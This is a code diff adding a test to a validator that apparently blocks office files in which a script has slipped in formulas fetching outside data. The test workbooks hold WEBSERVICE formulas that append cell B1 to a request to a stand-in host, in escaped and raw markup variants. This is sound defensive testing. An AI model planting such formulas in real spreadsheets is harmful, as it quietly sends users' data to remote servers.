@@ -1987,5 +1987,25 @@ describe('findBrokenFile', () => {
         '"deck.pptx" was not saved: the script added a formula that fetches data from outside the file',
       )
     })
+
+    it('keeps a fetching formula only when the file it read writes it the same way, markup and all', async () => {
+      // The second cell is the script's edit, so a saved book never equals the one it was read from.
+      const book = (formula: string, edit = '') =>
+        zipSync({
+          'xl/worksheets/sheet1.xml': strToU8(
+            `<worksheet xmlns:x="urn:x"><sheetData><row r="1"><c r="A1"><f>${formula}</f></c>${edit}</row></sheetData></worksheet>`,
+          ),
+        })
+      // Both decode to the same text, but Excel may drop the element and request another URL.
+      const escaped = 'WEBSERVICE("https://example.test/&lt;x:y/&gt;"&amp;B1)'
+      const markup = 'WEBSERVICE("https://example.test/<x:y/>"&amp;B1)'
+      const edited = (formula: string) => book(formula, '<c r="B1"><v>1</v></c>')
+      const refusal = '"a.xlsx" was not saved: the script added a formula that fetches data from outside the file'
+
+      expect(await check('a.xlsx', edited(markup), [book(escaped)])).toStartWith(refusal)
+      expect(await check('a.xlsx', edited(escaped), [book(markup)])).toStartWith(refusal)
+      expect(await check('a.xlsx', edited(markup), [book(markup)])).toBeUndefined()
+      expect(await check('a.xlsx', edited(escaped), [book(escaped)])).toBeUndefined()
+    })
   })
 })
